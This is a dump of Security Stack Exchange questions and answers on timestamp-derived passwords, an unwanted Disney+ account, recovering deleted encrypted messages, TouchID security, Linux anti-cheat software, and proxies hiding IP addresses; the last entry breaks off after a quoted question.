"263582","263582","Is a sha256 hash of a unix timestamp a strong password","<p>I am setting up a postgres db that will never be used by humans. In fact, I really don't need to know it myself ever. I assumed that just using a 256bit(64 alphanumeric chars) hash of a unix timestamp IE:</p>
<pre><code>date +%s%3N | sha256sum
</code></pre>
<p>A very important detail is I am not &quot;hashing a password&quot;... I am hashing a timestamp and <em><strong>using the sha256 hash as the password in the db connection string.</strong></em></p>
<p>would be pretty damn strong. An example of one I could use has 31 lowercase chars and 33 integers, for an entropy of ~330 bits, which is.... well... I'd say pretty damn solid, if not completely insanely overkill. The reason I ask is because it <em><strong>STILL</strong></em> got flagged by chainlink's password complexity check for only having lowercase chars and numbers.</p>
<p>So... My question is, are they right? Is there something wrong with a 64 character alphanumeric password just because it doesn't have fancy capital letters? Is there something inherently wrong with using sha256 algo with a timestamp like this?</p>
<p>I am contemplating raising an issue on their github stating that I should not have to set their <code>SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true</code> flag for such a password, and that they should consider the actual entropy of the password instead of just applying a set of simple rules.</p>
","25","6","263597","<p>To bring some of the answers together in a more concise way. The short answer is <strong>NOT AT ALL</strong>.</p>
<p>The reason is that the entropy of the UNIX timestamp is entirely dependent on the time interval an attacker can assume contains the timestamp, once they've determined this was the  method used for generation. If they know the date, they can generate every <code>sha256sum</code> that could be created within that window in a matter of seconds. Even if they only know within a 30 day interval, they could guess all the hashes in a few mins.</p>
<p>The correct way would be to use a <em><strong>cryptographically secure</strong></em> RNG to generate the password. One linux native option would be to use <code>urandom</code> to generate a 256bit string of utf8 chars IE:</p>
<pre><code>cat /dev/urandom | tr -dc '[:alnum:]' | fold -w ${1:-64} | head -n 1
</code></pre>
<p>Another (more secure) option would be to use a tool specifically designed for generating secure random keys (IE <code>OpenSSL</code>):</p>
<pre><code>openssl rand -base64 48
</code></pre>
","13"
"263582","263582","Is a sha256 hash of a unix timestamp a strong password","<p>I am setting up a postgres db that will never be used by humans. In fact, I really don't need to know it myself ever. I assumed that just using a 256bit(64 alphanumeric chars) hash of a unix timestamp IE:</p>
<pre><code>date +%s%3N | sha256sum
</code></pre>
<p>A very important detail is I am not &quot;hashing a password&quot;... I am hashing a timestamp and <em><strong>using the sha256 hash as the password in the db connection string.</strong></em></p>
<p>would be pretty damn strong. An example of one I could use has 31 lowercase chars and 33 integers, for an entropy of ~330 bits, which is.... well... I'd say pretty damn solid, if not completely insanely overkill. The reason I ask is because it <em><strong>STILL</strong></em> got flagged by chainlink's password complexity check for only having lowercase chars and numbers.</p>
<p>So... My question is, are they right? Is there something wrong with a 64 character alphanumeric password just because it doesn't have fancy capital letters? Is there something inherently wrong with using sha256 algo with a timestamp like this?</p>
<p>I am contemplating raising an issue on their github stating that I should not have to set their <code>SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true</code> flag for such a password, and that they should consider the actual entropy of the password instead of just applying a set of simple rules.</p>
","25","6","263626","<p>There's a lot of moaning about how you're deriving your password.  It is a little suspect but answers assume an informed attacker.  Depending on the value of the thing being protected, it's likely fine.  Even if you sourced the password from the most complex of randomness, if it randomly spat out only lower case letters, your actual question would still stand.</p>
<p>&quot;Does the password contain [x,y,z]?&quot; is easier to program and explain to users than entropy.  So we're left with a well meaning but ultimately blind set of rules.  Is randomly choosing only lower case letters from a larger set less good?  Against, the attacker that is playing by the original rules, it's exactly the same.  It does open one to an attacker playing by a lesser set of rules.  But there is a password length which is likely too much to guess by anything other than an offline attack, if that.</p>
<p>Should the project loosen their standards?  Probably not when the user could instead add an instance of each missing type to the end of the password instead.  Or in this case choose an encoding which likely has all of the required character types (Base64?).</p>
","-1"
"263582","263582","Is a sha256 hash of a unix timestamp a strong password","<p>I am setting up a postgres db that will never be used by humans. In fact, I really don't need to know it myself ever. I assumed that just using a 256bit(64 alphanumeric chars) hash of a unix timestamp IE:</p>
<pre><code>date +%s%3N | sha256sum
</code></pre>
<p>A very important detail is I am not &quot;hashing a password&quot;... I am hashing a timestamp and <em><strong>using the sha256 hash as the password in the db connection string.</strong></em></p>
<p>would be pretty damn strong. An example of one I could use has 31 lowercase chars and 33 integers, for an entropy of ~330 bits, which is.... well... I'd say pretty damn solid, if not completely insanely overkill. The reason I ask is because it <em><strong>STILL</strong></em> got flagged by chainlink's password complexity check for only having lowercase chars and numbers.</p>
<p>So... My question is, are they right? Is there something wrong with a 64 character alphanumeric password just because it doesn't have fancy capital letters? Is there something inherently wrong with using sha256 algo with a timestamp like this?</p>
<p>I am contemplating raising an issue on their github stating that I should not have to set their <code>SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true</code> flag for such a password, and that they should consider the actual entropy of the password instead of just applying a set of simple rules.</p>
","25","6","263629","<p>There are so many misconceptions about passwords and security, and many of them are in this question.</p>
<p>tl;dr: Your choice is <strong>weak</strong> and <strong>predictable</strong>.</p>
<p>The main thing a password should be is not complex or full of special characters or anything like that, but <strong>hard to figure out</strong>. That's why your name is a bad password, even if you have a long name full of foreign accent characters. If you have such a name, go ahead and put it into five or six of the &quot;online password strength metres&quot; you find in Google and half of them will probably tell you that's a good password. It clearly isn't.</p>
<p>First of all, <strong>what is your threat model?</strong> - or in simpler terms: What is it that you are defending against whom? Is this database your personal gym log that nobody really cares about, including you; or is it your $200 Mio. crypto currency wallet, the only photographs of your late grandmother or a commercial database where people could lose their jobs? All different scenarios with different use cases and different levels of &quot;secure&quot;.</p>
<p>We don't know your use case, so we can only give you generic advise:</p>
<ul>
<li>The hashes might look random, but they aren't. In fact, they are perfectly predictable by anyone who knows your method. You could just as well use the timestamp directly and I think you'd agree that's a crappy password.</li>
<li>Generating a random password (simply get /dev/urandom) would be a much better idea. Among other things you can map it to the whole ASCII space, not just 0-9a-f. It's also not predictable.</li>
<li>Why would you want to use a timestamp at all? Does it serve a purpose? Or is it just a cheap source of randomness? In which case, why don't you use a real source of randomness?</li>
<li>If you thought of putting all that into a script, you've probably shot yourself in the foot as that makes it a) easy to find for an attacker who managed to get some level of access and b) highly predictable because with a bit of log or bash_history reading, said attacker can probably make an educated guess at when that was executed and narrow down the possible timestamps to be within reasonable brute-force territory.</li>
</ul>
<p>So please do what every install script does: Simply generate a random password of sufficient length.</p>
<p>Finally:</p>
<blockquote>
<p>I am contemplating raising an issue on their github stating that I
should not have to set their
SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true flag for such a password,
and that they should consider the actual entropy of the password
instead of just applying a set of simple rules.</p>
</blockquote>
<p>Before doing that, please <a href=""https://github.com/postgres/postgres/blob/master/contrib/passwordcheck/passwordcheck.c"" rel=""nofollow noreferrer"">check the actual source</a> and you'll find that your hash should already pass the checks almost every time (except the one-in-a-million where the hash is completely numeric or alphabetical). Unless your distro includes CrackLib, there isn't really much checking going on and the functionality is included as an example so you can <em>write your own checks</em>.</p>
","5"
"263582","263582","Is a sha256 hash of a unix timestamp a strong password","<p>I am setting up a postgres db that will never be used by humans. In fact, I really don't need to know it myself ever. I assumed that just using a 256bit(64 alphanumeric chars) hash of a unix timestamp IE:</p>
<pre><code>date +%s%3N | sha256sum
</code></pre>
<p>A very important detail is I am not &quot;hashing a password&quot;... I am hashing a timestamp and <em><strong>using the sha256 hash as the password in the db connection string.</strong></em></p>
<p>would be pretty damn strong. An example of one I could use has 31 lowercase chars and 33 integers, for an entropy of ~330 bits, which is.... well... I'd say pretty damn solid, if not completely insanely overkill. The reason I ask is because it <em><strong>STILL</strong></em> got flagged by chainlink's password complexity check for only having lowercase chars and numbers.</p>
<p>So... My question is, are they right? Is there something wrong with a 64 character alphanumeric password just because it doesn't have fancy capital letters? Is there something inherently wrong with using sha256 algo with a timestamp like this?</p>
<p>I am contemplating raising an issue on their github stating that I should not have to set their <code>SKIP_DATABASE_PASSWORD_COMPLEXITY_CHECK=true</code> flag for such a password, and that they should consider the actual entropy of the password instead of just applying a set of simple rules.</p>
","25","6","263665","<p>No, and not because of the Unix Timestamp. A hash digest is a hex string.</p>
<p>A hash digest has a limited character set (16). This is low hanging fruit for a brute force attack.</p>
<p>An informed attacker need only cycle through timestamps from time a to time b, given he can ballpark the year(s) of the timestamp this may be trivial.</p>
<p>In addition, it will be hard to remember, and therefore likely to be exposed by saved copies, vaults notwithstanding.</p>
<p>However it is suitably complex for a database connection string and transport neutral. Providing you secure access to the database with a tunnel to a private endpoint that is also firewalled, it is OK.</p>
<p>You would not use the unhexed value as it may not be transport neutral and may lead to unpredictable translations, escape sequences also notwithstanding.</p>
<p>The key here is not to share how this is generated at all, your own people would prefer not to know, as it grants the gift of plausible deniability.</p>
<p>A string is a string is a string. Too many academic answers here. If you do not tell anyone, it is not predictable. I defy anyone given a arbitrary hex string to reverse engineer the document it was generated from.</p>
","-1"
"263564","263564","Someone created a Disney+ account with my e-mail address. Are there any security concerns?","<p>I got an Email (to my iCloud address) from Disney+. The email contained a subscriber agreement. I did not register for their service myself. On the Disney+ website I saw that there was indeed an account for my email address. Using &quot;forget password&quot; I was able to log into the account and change the password.</p>
<p>I contacted Disney support, asking them to delete the account. However, they said that they can not delete the account since there is a running subscription via iCloud. This subscription has to be cancelled in order for the account to be deleted.</p>
<p>At this point I was very concerned that someone has hacked into my iCloud (which runs under email address used for the Disney+ account). So I logged into my iCloud and checked the running subscriptions and active devices but there was no suspicious activity at all and no Disney+ subscription listed.</p>
<p><strong>My questions are:</strong></p>
<ul>
<li>is it technically possible that the Disney+ Account is connected to
my email-address but using a different (unknown) iCloud account for
the subscription?</li>
<li>are there any security concerns for me or have I just randomly be given
a free Disney+ account (by someone else's mistake)?</li>
</ul>
","29","3","263568","<p><strong>Yes</strong>, it's possible to use your email address and <a href=""https://help.disneyplus.com/csp?id=csp_article_content&amp;sys_kb_id=502e0bdbdb0bb450d060269ed396193c"" rel=""noreferrer"">pay via credit card, PayPal, subscription cards or the respective mobile providers (Apple / Google Pay)</a>. <strong>It does not have to be a payment with Apple Pay / your iCloud account</strong>. As you are able to login, you should <a href=""https://www.howtogeek.com/545976/how-to-update-your-disney-billing-information/"" rel=""noreferrer"">see the used payment method</a> in the account's &quot;billing details&quot;.</p>
<p><strong>I do not see any further security concerns on your side</strong>. You already checked for an intrusion into your iCloud account and there seems to be none, which is good. You contacted Disney and they did not care (which is questionable). I'd say whoever created this account is going to realize he is no longer able to login and therefore going to cancel the payment subscription sooner or later. Lesson learned for the person who created the account with a random email address.</p>
<p>You probably get a notification email after the subscription has ended, then you are able to delete the account.</p>
","28"
"263564","263564","Someone created a Disney+ account with my e-mail address. Are there any security concerns?","<p>I got an Email (to my iCloud address) from Disney+. The email contained a subscriber agreement. I did not register for their service myself. On the Disney+ website I saw that there was indeed an account for my email address. Using &quot;forget password&quot; I was able to log into the account and change the password.</p>
<p>I contacted Disney support, asking them to delete the account. However, they said that they can not delete the account since there is a running subscription via iCloud. This subscription has to be cancelled in order for the account to be deleted.</p>
<p>At this point I was very concerned that someone has hacked into my iCloud (which runs under email address used for the Disney+ account). So I logged into my iCloud and checked the running subscriptions and active devices but there was no suspicious activity at all and no Disney+ subscription listed.</p>
<p><strong>My questions are:</strong></p>
<ul>
<li>is it technically possible that the Disney+ Account is connected to
my email-address but using a different (unknown) iCloud account for
the subscription?</li>
<li>are there any security concerns for me or have I just randomly be given
a free Disney+ account (by someone else's mistake)?</li>
</ul>
","29","3","263571","<p>While it is possible someone else created the account <strong>and paid for it</strong>, it's pretty unlikely.</p>
<p><strong>It's more likely it's actually your account.</strong> Did you recently get a new phone or phone contract? Verizon, and probably others, offer temporary free Disney+ accounts and often automatically set them up.</p>
<p>Log back into the account and examine the billing information carefully to see how it's paid. Be doubly careful with PayPal as vendors commonly default the initial payment as <em>recurring</em>, allowing them to bill you for subsequent payments without notification.</p>
<p>In the end, the only risk to you is <strong>billing</strong>. Find out how it's billed.</p>
","8"
"263564","263564","Someone created a Disney+ account with my e-mail address. Are there any security concerns?","<p>I got an Email (to my iCloud address) from Disney+. The email contained a subscriber agreement. I did not register for their service myself. On the Disney+ website I saw that there was indeed an account for my email address. Using &quot;forget password&quot; I was able to log into the account and change the password.</p>
<p>I contacted Disney support, asking them to delete the account. However, they said that they can not delete the account since there is a running subscription via iCloud. This subscription has to be cancelled in order for the account to be deleted.</p>
<p>At this point I was very concerned that someone has hacked into my iCloud (which runs under email address used for the Disney+ account). So I logged into my iCloud and checked the running subscriptions and active devices but there was no suspicious activity at all and no Disney+ subscription listed.</p>
<p><strong>My questions are:</strong></p>
<ul>
<li>is it technically possible that the Disney+ Account is connected to
my email-address but using a different (unknown) iCloud account for
the subscription?</li>
<li>are there any security concerns for me or have I just randomly be given
a free Disney+ account (by someone else's mistake)?</li>
</ul>
","29","3","263573","<p>This has happened to me as well.</p>
<p>You have two options: completely ignore the situation or take over the account (by using &quot;Reset password&quot;).</p>
<p>In both cases there's no risk or anything. Your email alone is not enough to charge you.</p>
","6"
"263558","263558","Can encrypted and deleted files be recovered?","<p>If you’ve watched the news, you know that <a href=""https://www.politico.com/news/2022/07/19/national-archives-deleted-jan-6-secret-service-texts-00046552"" rel=""nofollow noreferrer"">Secret Service text messages were deleted</a>. Now they’re trying to recover them.</p>
<p>If those text messages were encrypted before deletion, and the key was also intentionally deleted, are those text messages still recoverable?</p>
","0","3","263574","<p>This depends on the storage being used and encryption being used. There's zero difference between deleting encrypted or non-encrypted files - all the files on the disk are just data.</p>
<p>The biggest difference is whether the decryption key is still available and then there are methods of encryption when altering/wiping relatively little data is enough to make it <a href=""https://www.buskill.in/luks-self-destruct/"" rel=""nofollow noreferrer"">impossible</a> to restore anything even if the password/decryption phrase is recovered, e.g. check <a href=""https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup"" rel=""nofollow noreferrer"">LUKS</a>.</p>
<p>In the case of an SSD storage wear levelling could theoretically be used to recover overwritten data but to this date I've not heard of such cases.</p>
<p>It could be done in a controlled lab environment or by the OEM but it's near completely out of the realm of possibilities for a normal application running in your run of the mill operating system such as Windows, Linux or MacOS.</p>
<p>Since the information on how and where the data in question was stored (or e.g. backups had been made) is not available it's impossible to answer your question in regard to this exact situation. As for the average use case encrypted data can be destroyed a whole lot faster than destroying individual files one by one.</p>
","-1"
"263558","263558","Can encrypted and deleted files be recovered?","<p>If you’ve watched the news, you know that <a href=""https://www.politico.com/news/2022/07/19/national-archives-deleted-jan-6-secret-service-texts-00046552"" rel=""nofollow noreferrer"">Secret Service text messages were deleted</a>. Now they’re trying to recover them.</p>
<p>If those text messages were encrypted before deletion, and the key was also intentionally deleted, are those text messages still recoverable?</p>
","0","3","263576","<p>It depends on many factors.</p>
<p>First let's dispense with the encryption part. Encryption has nothing to do with recovery. Whether the content can be decrypted is a function of key recovery but has no bearing on recovery in itself.</p>
<p>Plain text messaging is not encrypted.</p>
<p>Recovery can be complicated or dirt simple depending upon details of the system:</p>
<p>Are you attempting recovery from an end-device, i.e. a phone? Depending upon the phone and the text message app, it could be simple or impossible if a secure wipe was performed. Contrary to one of the comments, Flash storage does <strong>not</strong> necessarily physically delete the data, that would be a <em>TRIM</em> function.</p>
<p>Depending upon the system, messages may have gone through a central server. In that case, an entire history of messages could be sitting on the server waiting to be pulled off.</p>
","2"
"263558","263558","Can encrypted and deleted files be recovered?","<p>If you’ve watched the news, you know that <a href=""https://www.politico.com/news/2022/07/19/national-archives-deleted-jan-6-secret-service-texts-00046552"" rel=""nofollow noreferrer"">Secret Service text messages were deleted</a>. Now they’re trying to recover them.</p>
<p>If those text messages were encrypted before deletion, and the key was also intentionally deleted, are those text messages still recoverable?</p>
","0","3","263608","<p>Deleted data can be recovered as long as nothing else has written over that memory space, some tools write garbage data over memory space for that reason. They won't be readable nor decryptable if it is recent Android or iPhone. When you say text messages do you mean SMS? SMS get sent by carriers without encryption. Most carriers keep information about SMS like when it was sent and who to and by who etc.. some carriers even store the content. It is easier to get from the carriers if the messages were recent than decrypting data, more info is needed though about the phone.</p>
","0"
"263531","263531","How is TouchID more secure than a simple password?","<p>This likely stems from my complete lack of familiarity with encryption technology and IT security in general, however it isn't clear to me how biometric authentication (such as Apple's TouchID) makes the data it protects more secure than a simple password.</p>
<p>It's clear to me that, <em>individually</em>, biometric authentication is more secure than a memorable passcode. A fingerprint, face or voice can't really be &quot;guessed&quot;, for example, in the same way a password can, and is characterized by something like thousands or millions of datapoints. However, biometric authentication systems such as TouchID often only <em>complement</em> a simple passcode. If, for whatever reason, I'm unable to unlock my iPhone with my face or thumb, I can still unlock it with a 4-digit passcode.</p>
<p>Since e.g. TouchID only adds another way to unlock e.g. an iPhone, isn't the protected data in principle <em>easier</em> to &quot;hack&quot; (and, in practice, something like just as difficult)? There are now <em>two</em> &quot;entryways&quot;.</p>
","18","4","263535","<p>The main reason for Apple to introduce TouchID was to make people use more complex passwords. For the sake of quick and easy access to their phones, people often used very simple passwords or no passwords at all, because they found it impractical to type in long passwords.</p>
<p>With TouchID, it became possible to use long and thus more secure passwords, while still being able to quickly and easily access the phone with just a finger‘s touch.</p>
<p>So, while TouchID does not add security by itself, its practical use allows to improve the security of the existing protection method.</p>
","35"
"263531","263531","How is TouchID more secure than a simple password?","<p>This likely stems from my complete lack of familiarity with encryption technology and IT security in general, however it isn't clear to me how biometric authentication (such as Apple's TouchID) makes the data it protects more secure than a simple password.</p>
<p>It's clear to me that, <em>individually</em>, biometric authentication is more secure than a memorable passcode. A fingerprint, face or voice can't really be &quot;guessed&quot;, for example, in the same way a password can, and is characterized by something like thousands or millions of datapoints. However, biometric authentication systems such as TouchID often only <em>complement</em> a simple passcode. If, for whatever reason, I'm unable to unlock my iPhone with my face or thumb, I can still unlock it with a 4-digit passcode.</p>
<p>Since e.g. TouchID only adds another way to unlock e.g. an iPhone, isn't the protected data in principle <em>easier</em> to &quot;hack&quot; (and, in practice, something like just as difficult)? There are now <em>two</em> &quot;entryways&quot;.</p>
","18","4","263541","<p>You are correct that the authentication is only as strong as its weakest method, but there's one more feature that complements raw secret entropy:</p>
<p><strong>Rate limiting</strong></p>
<p>If you have an authentication method that is only used sporadically, you can afford to have extremely strict rate limiting for wrong guesses. The iPhone, for example, locks itself completely on <a href=""https://discussions.apple.com/thread/5428897"" rel=""nofollow noreferrer"">only six wrong guesses</a>.</p>
<p>That's a 0.06% chance of guessing a 4-digit PIN, not to mention that failed attempts will alert the owner about the break-in. And since the guesses are tracked by the phone's Trusted Platform Module, it's exceptionally hard to bypass the rate limiting.</p>
","2"
"263531","263531","How is TouchID more secure than a simple password?","<p>This likely stems from my complete lack of familiarity with encryption technology and IT security in general, however it isn't clear to me how biometric authentication (such as Apple's TouchID) makes the data it protects more secure than a simple password.</p>
<p>It's clear to me that, <em>individually</em>, biometric authentication is more secure than a memorable passcode. A fingerprint, face or voice can't really be &quot;guessed&quot;, for example, in the same way a password can, and is characterized by something like thousands or millions of datapoints. However, biometric authentication systems such as TouchID often only <em>complement</em> a simple passcode. If, for whatever reason, I'm unable to unlock my iPhone with my face or thumb, I can still unlock it with a 4-digit passcode.</p>
<p>Since e.g. TouchID only adds another way to unlock e.g. an iPhone, isn't the protected data in principle <em>easier</em> to &quot;hack&quot; (and, in practice, something like just as difficult)? There are now <em>two</em> &quot;entryways&quot;.</p>
","18","4","263544","<p>In addition to the points made by others, if you use only a PIN then you have to use a PIN to unlock it in public.   Each unlock is a chance for someone to see or record in video what your unlock code is.  Overcoming biometric authentication if they steal your phone and have never seen you enter your PIN is much more difficult.</p>
","17"
"263531","263531","How is TouchID more secure than a simple password?","<p>This likely stems from my complete lack of familiarity with encryption technology and IT security in general, however it isn't clear to me how biometric authentication (such as Apple's TouchID) makes the data it protects more secure than a simple password.</p>
<p>It's clear to me that, <em>individually</em>, biometric authentication is more secure than a memorable passcode. A fingerprint, face or voice can't really be &quot;guessed&quot;, for example, in the same way a password can, and is characterized by something like thousands or millions of datapoints. However, biometric authentication systems such as TouchID often only <em>complement</em> a simple passcode. If, for whatever reason, I'm unable to unlock my iPhone with my face or thumb, I can still unlock it with a 4-digit passcode.</p>
<p>Since e.g. TouchID only adds another way to unlock e.g. an iPhone, isn't the protected data in principle <em>easier</em> to &quot;hack&quot; (and, in practice, something like just as difficult)? There are now <em>two</em> &quot;entryways&quot;.</p>
","18","4","263587","<p>I am not sure it is more secure, I would echo what others say about convenience.
A couple of real world scenarios;</p>
<p>Fingerprints: if somebody looks over your shoulder and sees what password you enter, they can't do it with a fingerprint.</p>
<p>Password: They can't get into your phone without it, such as tapping your phone onto your fingerprint sensor when you are asleep etc..</p>
<p>It would be more secure if it required both.</p>
","0"
"263244","263244","How dangerous can an anti-cheat software be, on Linux operating systems?","<p>There are anti-cheat software for Windows that run with really high privileges in order to detect cheats on the users' machine. These anti-cheat claim to run 'on kernel' and scan the user files and memory to detect software that could be interacting with the game (e.g. cheats/hacks).</p>
<p>Recently, I found that some of those companies have their anti-cheat support for Linux games (native ones), which made me wonder how that detection would work. What can these anti-cheat software do on Linux, especially if the game is running on user-mode and not sudo? Would they be able to scan other users' processes/memory and detect a cheat running on another user, for example?</p>
","2","4","263245","<p>TLDR: There is a trust issue here.  If the software is from a legal trusted company, they will self limit what they do.  If the program runs as a non-administrator user, there is a limited number of things they can do anyway, and if you put it in a container, it is more limited.  If the company is trusted, worrying about this is paranoia.  If the software is pirated or the company is not trusted,the paranoia is justified.</p>
<p>If the game runs as a user process without any administrative access, it won't be able to modify the kernel or scan the memory of other processes, even within the same user.</p>
<p>It would be able to look at files on the system unless they were protected by permissions that prevented it.  Similarly, it could look at what other things were running on the system, but beyond limited things that are published by processes (visible in <code>ps</code> for example), it can't directly access the memory of other processes.</p>
<p>&quot;How dangerous&quot;... is a very vague question.  Here are some possible dangers:</p>
<ul>
<li>Danger of cheating being detected:  Presumably this would be high, otherwise it would not be very effective as anti-cheat protection.</li>
<li>Danger to the health of the system:  If it is running as a user and not an administrator, this is low but not zero.  However, a bigger concern is if you trust the company that wrote the software.  Presumably there would be more legal protection and recourse for the consumer if the company intentionally damaged your system.  This need for trust would not be different if the software did have administrator access.</li>
<li>Danger to the runtime performance of the system:  anti-cheat systems are notorious for affecting system performance.  However, this presumably would be temporary and only occur when it was running.  And, again, if this danger is real, it might also affect the performance of the game, which would lead to unfavorable reviews and hurt the company in the long run.  So this is unlikely, or at least, unlikely to be a long term issue.</li>
<li>Danger of information exfiltration: Any program running on the system (user or administrator) that isn't running in a limited container can look through your files and check what software is installed, (within limits) sniff keystrokes, probe your local network, and connect to outside networks.  Again, this is a trust issue -- if a company was found to be exfiltrating sensitive data from user systems, it would harm their reputation and become lawsuit material, so most companies will limit what they exfiltrate and likely list it in their license agreement.</li>
</ul>
<p>In older linux and unix, a process with administrator access would be able to access memory of other processes.  However, recent versions of linux have made this more and more difficult, but not entirely impossible.  Even if direct memory access is blocked, some access can be obtained with ptrace().</p>
<p>As to what anti-cheat software would do in linux... Unless the company divulges this information, it would be difficult to say.  If cheaters were told up front everything the software did, it may be difficult for the software to be effective at preventing cheating.</p>
","1"
"263244","263244","How dangerous can an anti-cheat software be, on Linux operating systems?","<p>There are anti-cheat software for Windows that run with really high privileges in order to detect cheats on the users' machine. These anti-cheat claim to run 'on kernel' and scan the user files and memory to detect software that could be interacting with the game (e.g. cheats/hacks).</p>
<p>Recently, I found that some of those companies have their anti-cheat support for Linux games (native ones), which made me wonder how that detection would work. What can these anti-cheat software do on Linux, especially if the game is running on user-mode and not sudo? Would they be able to scan other users' processes/memory and detect a cheat running on another user, for example?</p>
","2","4","263246","<p>Linux as an operating system is wide open for meddling using 1000 ways, so there will be no anti-cheat software for Linux in the nearest future, at least for distros which don't offer some sort of guarantee that the system hasn't been tampered with.</p>
<p>In Windows there are multiple layers of protection which guarantee that you run the pristine Windows installation, including executable files and libraries since almost every executable file in Windows is digitally signed.</p>
<p>In Linux at the moment only the boot loader (GRUB) and the kernel with its modules are signed (and that applies only to a handful of distros including Fedora, RHEL and Ubuntu), everything else is not.</p>
<p>When you cannot guarantee that your system libraries are not modified all bets are off.</p>
<blockquote>
<p>What can these anti-cheat software do on Linux, especially if the game is running on user-mode and not sudo?</p>
</blockquote>
<p>Everything any application running under user account can do, including reading your files, or even sniffing your passwords. It's pretty trivial to do in X11 (which allows all applications to access all input devices) or using <code>LD_PRELOAD=</code> under Wayland.</p>
<p>If you're concerned about any of this, you should not be running proprietary software ever. I'd even say that you shouldn't even use a normal PC which is rife with proprietary features you cannot control, e.g. UEFI, Intel ME/AMD PSP, GPU, WiFi/Bluetooth, LAN, SSD/HDD, etc. etc. etc.</p>
","1"
"263244","263244","How dangerous can an anti-cheat software be, on Linux operating systems?","<p>There are anti-cheat software for Windows that run with really high privileges in order to detect cheats on the users' machine. These anti-cheat claim to run 'on kernel' and scan the user files and memory to detect software that could be interacting with the game (e.g. cheats/hacks).</p>
<p>Recently, I found that some of those companies have their anti-cheat support for Linux games (native ones), which made me wonder how that detection would work. What can these anti-cheat software do on Linux, especially if the game is running on user-mode and not sudo? Would they be able to scan other users' processes/memory and detect a cheat running on another user, for example?</p>
","2","4","263254","<p>High-privilege anti-cheat software will always require high privileges to install (though it does not necessarily need any special privileges to run the game after installation). Linux is no more protected than Windows here. If a game installer installs a kernel module on Linux, that has just as many permissions and can do just as much damage if untrustworthy as a similar kernel module on Windows. What's more, if Linux ever takes off for gaming, you'll see such anti-cheat kernel modules appearing (for e-sports games, at least) for the same reason that they exist on Windows: if you don't have them, the cheat code will go into the kernel where user-mode anti-cheat software can't find it.</p>
<p>One possible difference is that, on Linux, distributing software that links directly into the kernel but is not compatible with the GPLv2 is frowned upon, and the kernel will complain about being tainted with proprietary software. Of course, if you're playing games on Linux at all, there's a decent chance your kernel is already tainted by the proprietary NVidia graphics driver. Also, it's not like the kernel has some magic way to tell whether any given module is open source or not; modules can lie to the kernel about that, and/or after being loaded, they can modify the &quot;am I tainted?&quot; check and flag within the kernel to report whatever they want. Whether such lies or modification would violate the GPL is a question for the courts to decide, but it wouldn't be the first time that proprietary software has pulled such a stunt.</p>
<p>(Or you could make the anti-cheat software open source, but nobody is likely to do that; if the cheat makers can see exactly what the anti-cheat is doing and when, it's way easier to evade or spoof it, and thus immediately win the current round of the cheat-vs-anticheat battle.)</p>
<hr />
<p>Obviously, cheat-vs-anticheat is a constant game of cat-and-mouse. Anti-cheat software can only look for the kinds of cheats it knows about. Cheat software can - especially if installed before the anti-cheat - modify the anti-cheat software or the kernel itself such that the anti-cheat thinks it's running but can't see the cheat software. The anti-cheat software could potentially try to go even deeper - to the hypervisor, to the firmware, to the hardware (or rather to firmware running on peripheral hardware such as the GPU or network card) - but it can't ever go deeper than the cheat software can in theory go, so there's no way to reliably &quot;win&quot; this contest.</p>
<p>Whether or not cheat vs. anti-cheat is winning in the moment, all of us who don't cheat lose. Installers for games (that we probably don't even play competitively) worm their way deeper and deeper into the system, changing (and potentially breaking or spying on or opening backdoors in) stuff that the user doesn't even know about. Game publishers spend resources on anti-cheat systems instead of gameplay improvements, and OS developers have to accommodate third-party code in unexpected places doing unexpected things, or else people complain that their games stopped working after the last OS update. It's deeply unfortunate.</p>
","0"
"263244","263244","How dangerous can an anti-cheat software be, on Linux operating systems?","<p>There are anti-cheat software for Windows that run with really high privileges in order to detect cheats on the users' machine. These anti-cheat claim to run 'on kernel' and scan the user files and memory to detect software that could be interacting with the game (e.g. cheats/hacks).</p>
<p>Recently, I found that some of those companies have their anti-cheat support for Linux games (native ones), which made me wonder how that detection would work. What can these anti-cheat software do on Linux, especially if the game is running on user-mode and not sudo? Would they be able to scan other users' processes/memory and detect a cheat running on another user, for example?</p>
","2","4","263260","<p>It all depends on how the Anti-cheat software is written.</p>
<p>For example:</p>
<ul>
<li>if it is written like a kernel module. It can wreak havoc on your system, since it will have privileged acces to everything, and is highly dependent on the specific kernel you are running.</li>
<li>if it is written as a “snooping” tool, that runs with root privileges, it depends on what sysctl flags you have set.</li>
<li>if it is written to utilize the eBPF system, it could monitor and possibly redirect any syscalls done by cheat software… without getting more acces to the system. eBPF software must be open source &amp; have a clear license. And they must be accepted by the kernel
Before they can run. (But than they can run even in some cases on a network card for example).</li>
</ul>
<p>Only the last type (<a href=""https://ebpf.io/"" rel=""nofollow noreferrer"" title=""eBPF"">eBPF</a>) is acceptable in my view as a anti-cheat measurement. Since you are restricted to what you can do, while not being restricted what to acces.</p>
<p>And since <a href=""https://microsoft.github.io/ebpf-for-windows/"" rel=""nofollow noreferrer"">Microsoft is adding support for eBPF to windows</a>, there is no longer any reason to not use it everywhere for anti-cheat software. (Imho).</p>
","0"
"262997","262997","Why is my IP address hidden over HTTPS but not HTTP while I'm behind a proxy?","<p>I am trying to connect to a supplier API but they have a whitelist of the IPs which can consume their API. I gave them my server IP so that they could add it to the whitelist but it is still not working.</p>
<p>I suspect this is coming from my company proxy which hides IP, so I did some tests : weirdly enough, I noticed that the real IP of my server could not be detected on most websites like &quot;who.is&quot; or &quot;whatismyipaddress.com&quot;. But as soon as I would try the same thing on websites using HTTP such as &quot;http://www.mon-ip.com/en/my-ip/&quot;, then the proxy is detected and my server IP is found out.</p>
<p>I don't have a very deep understanding of HTTP and HTTPS so I have no idea how using http makes it possible to detect the proxy and find out the real IP. I tried checking request headers and it doesn't seem that the IP is transmitted in HTTP requests...</p>
<p>I've looked up some topics on SO and couldn't manage to find anything closely related to that matter (best I found was <a href=""https://security.stackexchange.com/questions/36420/how-can-a-website-find-my-real-ip-address-while-im-behind-a-proxy"">How can a website find my real IP address while I&#39;m behind a proxy?</a> which is somehow confusing me even more). Would someone be able to enlighten me on how http makes it possible to detect proxies and find out the real IP being used ?</p>
","0","3","262998","<blockquote>
<p>I don't have a very deep understanding of HTTP and HTTPS so I have no idea how using http makes it possible to detect the proxy and find out the real IP. I tried checking request headers and it doesn't seem that the IP is transmitted in HTTP requests...</p>
</blockquote>
